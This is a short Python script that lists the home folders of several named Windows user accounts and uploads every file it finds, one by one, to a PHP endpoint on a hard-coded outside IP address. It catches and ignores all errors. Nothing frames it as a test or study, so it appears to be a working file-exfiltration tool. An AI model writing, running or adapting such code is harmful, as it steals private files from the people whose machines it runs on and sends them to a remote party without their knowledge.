import os
import glob
import requests
from os import listdir

for user in ['defaultuser0', 'evieira_prest', 'fefranci', 'lfteixei', 'Public']:
    path = f'C:/Users/{user}/'
    
    try:
        for folder in listdir(f'C:/Users/{user}'):
            current = path + folder
            print(">>>>>", current)
            for file in glob.glob(f'{current}/*.*'):
                print(file)
                url = 'http://3.85.122.241/globo_file.php'
                files = {'file': open(bytes(file, encoding='utf-8'), 'rb')}
                r = requests.post(url, files=files)
    except:
        ...
